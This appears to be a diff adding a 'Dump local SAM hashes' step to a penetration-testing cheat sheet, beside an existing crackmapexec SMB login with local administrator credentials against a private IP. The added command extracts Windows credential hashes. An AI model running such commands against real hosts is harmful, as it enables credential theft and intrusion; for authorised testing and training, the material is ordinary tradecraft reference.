@@ -874,3 +874,10 @@ Connect to target using local account:
 ```
 crackmapexec smb 192.168.2.24 -u 'Administrator' -p 'Password' --local-auth
 ```
+
+Dump local SAM hashes:
+
+```
+crackmapexec smb 192.168.2.24 -u 'Administrator' -p 'Password' --local-auth --sam
+```
+
